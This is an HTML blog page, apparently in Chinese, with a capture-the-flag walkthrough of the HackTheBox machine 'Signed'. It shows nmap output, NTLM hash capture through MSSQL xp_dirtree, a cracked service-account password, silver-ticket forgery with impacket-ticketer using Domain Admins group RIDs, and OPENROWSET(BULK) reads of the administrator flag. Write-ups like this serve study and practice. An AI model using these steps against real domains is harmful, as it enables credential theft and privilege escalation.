@@ -1,0 +1,222 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Warrenli's blog | Warrenli's blog</title><meta name="author" content="Warrenli"><meta name="copyright" content="Warrenli"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1 端口扫描1234567891011121314151617181920212223242526272829303132331433&#x2F;tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM| ms-sql-info: |   10.10.11.90:1433: |     Version: |       name: Mic">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Warrenli&#39;s blog">
+<meta property="og:url" content="https://blog.warrenli.fun/2025/10/30/Signed-mssql/index.html">
+<meta property="og:site_name" content="Warrenli&#39;s blog">
+<meta property="og:description" content="1 端口扫描1234567891011121314151617181920212223242526272829303132331433&#x2F;tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM| ms-sql-info: |   10.10.11.90:1433: |     Version: |       name: Mic">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.warrenli.fun/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-10-30T10:16:03.118Z">
+<meta property="article:modified_time" content="2025-10-30T10:27:34.180Z">
+<meta property="article:author" content="Warrenli">
+<meta property="article:tag" content="网安，web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.warrenli.fun/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "",
+  "url": "https://blog.warrenli.fun/2025/10/30/Signed-mssql/",
+  "image": "https://blog.warrenli.fun/img/butterfly-icon.png",
+  "datePublished": "2025-10-30T10:16:03.118Z",
+  "dateModified": "2025-10-30T10:27:34.180Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Warrenli",
+      "url": "https://blog.warrenli.fun"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://blog.warrenli.fun/2025/10/30/Signed-mssql/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Warrenli\'s blog',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Warrenli's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Warrenli's blog</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">无标题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-30T10:16:03.118Z" title="发表于 2025-10-30 18:16:03">2025-10-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-30T10:27:34.180Z" title="更新于 2025-10-30 18:27:34">2025-10-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1 端口扫描"></a>1 端口扫描</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.10.11.90:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2022 RTM</span><br><span class="line">|       number: 16.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2022</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">|_ssl-date: 2025-10-17T01:28:14+00:00; -27m08s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Issuer: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 3072</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-10-16T19:36:00</span><br><span class="line">| Not valid after:  2055-10-16T19:36:00</span><br><span class="line">| MD5:   bcf0:65fd:2aad:b5ad:8540:73c6:7b3b:4a5e</span><br><span class="line">|_SHA-1: e98b:528d:f20f:376b:b685:b52a:ba94:3360:9440:e816</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   10.10.11.90:1433: </span><br><span class="line">|     Target_Name: SIGNED</span><br><span class="line">|     NetBIOS_Domain_Name: SIGNED</span><br><span class="line">|     NetBIOS_Computer_Name: DC01</span><br><span class="line">|     DNS_Domain_Name: SIGNED.HTB</span><br><span class="line">|     DNS_Computer_Name: DC01.SIGNED.HTB</span><br><span class="line">|     DNS_Tree_Name: SIGNED.HTB</span><br><span class="line">|_    Product_Version: 10.0.17763</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -27m08s, deviation: 0s, median: -27m08s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="2-Mssql利用"><a href="#2-Mssql利用" class="headerlink" title="2 Mssql利用"></a>2 Mssql利用</h1><p>题目给了一个凭据，我们可以拿来直接登录<br><img src="img/Pasted%20image%2020251017123533.png" /><br><img src="img/Pasted%20image%2020251017133815.png" /></p>
+<p>拿到mssql第一时间想到的就是利用xp_cmdshell来拿shell，但是该用户的权限不足，无法成功。<br><img src="img/Pasted%20image%2020251017133926.png" /></p>
+<h2 id="2-1-NTML中继攻击"><a href="#2-1-NTML中继攻击" class="headerlink" title="2.1 NTML中继攻击"></a>2.1 NTML中继攻击</h2><p>然后我们还可以尝试xp_dirtree来实现NTML 中继攻击:</p>
+<blockquote>
+<p>xp_dirtree 是 SQL Server 中的一个<strong>系统存储过程</strong>，主要用于返回指定文件路径下的所有文件和子目录信息。</p>
+<p>这里如果我们指定路径是我们kali，触发smb认证，我们就可以尝试用responder来截获Net-NTML。<br>如果未开启smb签名，且未绑定通道，我们就能利用这个凭证了</p>
+</blockquote>
+<img src="img/Pasted%20image%2020251017134356.png" />
+<img src="img/Pasted%20image%2020251017134421.png" />
+
+<h2 id="2-2-爆破hash"><a href="#2-2-爆破hash" class="headerlink" title="2.2 爆破hash"></a>2.2 爆破hash</h2><img src="img/Pasted%20image%2020251017141134.png" />
+有了该用户的账号密码，我们可以尝试利用该账户提升我们在mssql中的权限
+
+<img src="img/Pasted%20image%2020251017142338.png" />
+
+<h2 id="2-3-生成白银票据"><a href="#2-3-生成白银票据" class="headerlink" title="2.3 生成白银票据"></a>2.3 生成白银票据</h2><p>这个账户大概率是mssql服务的服务账户，我们现在拿到了它的密码，可以生成对应的hash，也就是白银票据</p>
+<blockquote>
+<p>echo -n ‘purPLE9795!@’ | iconv -f UTF-8 -t UTF-16LE | openssl dgst -md4<br><img src="img/Pasted%20image%2020251017142634.png" /></p>
+</blockquote>
+<h2 id="2-4-生成管理员的st"><a href="#2-4-生成管理员的st" class="headerlink" title="2.4 生成管理员的st"></a>2.4 生成管理员的st</h2><p>先查看当前数据库实例中拥有 “系统管理员” 权限的所有账户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_helpsrvrolemember &#x27;sysadmin&#x27;</span><br></pre></td></tr></table></figure>
+<img src="img/Pasted%20image%2020251017153212.png" />
+
+<p>通过下面的解析脚本，获取管理员用户的SID</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def sid_bytes_to_string(b: bytes) -&gt; str:</span><br><span class="line">    if not b:</span><br><span class="line">        return None</span><br><span class="line">    rev = b[0]</span><br><span class="line">    sub_count = b[1]</span><br><span class="line">    ida = 0</span><br><span class="line">    for i in range(6):</span><br><span class="line">        ida = (ida &lt;&lt; 8) | b[2 + i]</span><br><span class="line">    parts = [&#x27;S&#x27;, str(rev), str(ida)]</span><br><span class="line">    for i in range(sub_count):</span><br><span class="line">        off = 8 + i*4</span><br><span class="line">        sub = b[off] | (b[off+1] &lt;&lt; 8) | (b[off+2] &lt;&lt; 16) | (b[off+3] &lt;&lt; 24)</span><br><span class="line">        parts.append(str(sub))</span><br><span class="line">    return &#x27;-&#x27;.join(parts)</span><br><span class="line"></span><br><span class="line"># 使用示例：如果有十六进制字符串（不带 0x），先转 bytes：</span><br><span class="line">hexstr = &quot;0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000&quot; </span><br><span class="line">b = bytes.fromhex(hexstr)</span><br><span class="line">print(sid_bytes_to_string(b))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="img/Pasted%20image%2020251017153553.png" />
+
+<p>获取SPN service，这里我们无法连上ldap，所以只能自己猜测几个可能的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mssql/dc01.signed.htb</span><br><span class="line">mssqlsvc/dc01.signed.htb</span><br><span class="line">sql/dc01.signed.htb</span><br></pre></td></tr></table></figure>
+
+<p>然后通过如下命令伪造一个属于1105组的用户的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid &#x27;S-1-5-21-4088429403-1159899800-2753317549&#x27; -domain signed.htb -spn mssql/dc01.signed.htb -groups 1105 IT</span><br></pre></td></tr></table></figure>
+<p>成功后利用生成的票据直接登录mssql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=/home/kali/Desktop/HTB/Signed/IT.ccache</span><br><span class="line">impacket-mssqlclient -debug DC01.signed.htb -k</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-5-getshell"><a href="#2-5-getshell" class="headerlink" title="2.5 getshell"></a>2.5 getshell</h2><p>现在我们有权限了，尝试反弹shell<br><img src="img/Pasted%20image%2020251017175010.png" /><br><img src="img/Pasted%20image%2020251017181658.png" /><br><img src="img/Pasted%20image%2020251017181707.png" /><br>成功读到，但是现在我们还没有权限读取管理员的flag<br><img src="img/Pasted%20image%2020251017181744.png" /></p>
+<blockquote>
+<p>要访问管理员目录需要在制作银票时使用 -groups 指定一个管理员组的RID，如500、512、516、519都可以，然后记得还要加上IT组的RID 1105，因为如果不加1105的话，在 SQL Server 里就不是 sysadmin，就无法执行 OPENROWSET(BULK) 等高权限操作。</p>
+</blockquote>
+<h2 id="2-6-权限提升"><a href="#2-6-权限提升" class="headerlink" title="2.6 权限提升"></a>2.6 权限提升</h2><p>上面的shell无法读取管理员的flag，因为 xp_cmdshell 创建的进程是运行在不同的安全上下文中的，它实际上是SQL Server → 模拟用户 mssqlsvc → cmd.exe 执行命令，因为创建了新的进程，所以会使用新的令牌，也就无法使用我们模拟的包含域管的令牌了。 所以就无法读取到管理员目录。</p>
+<p>我们这里尝试用OPENROWSET()函数读取管理员目录</p>
+<blockquote>
+<pre><code>OPENROWSET(BULK)是 SQL Server 的内部函数，它直接使用当前会话的模拟令牌来执行文件操作。
+由于我们伪造的银票在 PAC 中注入了 Domain Admins (512) 组，SQL Server 为我们的连接创建的模拟令牌就包含了域管权限。
+当 OPENROWSET(BULK) 尝试访问文件时，Windows 检查令牌发现包含 Domain Admins 组，因此允许访问管理员目录。
+</code></pre>
+</blockquote>
+<p>不过在此之前，还有一个问题:<br>    我们需要指定user-id 为mssqlsvc用户的rid ,不然会因为用户名不匹配SPN导致模拟失败，再后面利用伪造的票据使用OPENROWSET(BULK)读取文件时也会失败。</p>
+<p>获取mssqlsvc用户的sid:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell &gt; Get-WmiObject win32_useraccount</span><br></pre></td></tr></table></figure>
+<img src="img/Pasted%20image%2020251017230020.png" />
+那rid就是1103了。
+
+<p>现在重新伪造票据:<br><img src="img/Pasted%20image%2020251017230139.png" /></p>
+<p>读取文件:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM OPENROWSET(BULK N&#x27;C:\Users\Administrator\desktop\root.txt&#x27;, SINGLE_CLOB) AS Contents</span><br></pre></td></tr></table></figure>
+<img src="img/Pasted%20image%2020251017230400.png" />
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.warrenli.fun">Warrenli</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.warrenli.fun/2025/10/30/Signed-mssql/">https://blog.warrenli.fun/2025/10/30/Signed-mssql/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.warrenli.fun" target="_blank">Warrenli's blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/10/30/hello-world/" title="Hello World"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Hello World</div></div><div class="info-2"><div class="info-item-1">Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot;  More info: Writing Run server1$ hexo server  More info: Server Generate static files1$ hexo generate  More info: Generating Deploy to remote sites1$ hexo deploy  More info: Deployment </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Warrenli</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">1 端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Mssql%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">2 Mssql利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-NTML%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 NTML中继攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-%E7%88%86%E7%A0%B4hash"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 爆破hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E7%94%9F%E6%88%90%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 生成白银票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E7%94%9F%E6%88%90%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84st"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 生成管理员的st</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-getshell"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 权限提升</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/30/Signed-mssql/" title="无标题">无标题</a><time datetime="2025-10-30T10:16:03.118Z" title="发表于 2025-10-30 18:16:03">2025-10-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/30/hello-world/" title="Hello World">Hello World</a><time datetime="2025-10-30T09:54:51.759Z" title="发表于 2025-10-30 17:54:51">2025-10-30</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Warrenli</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
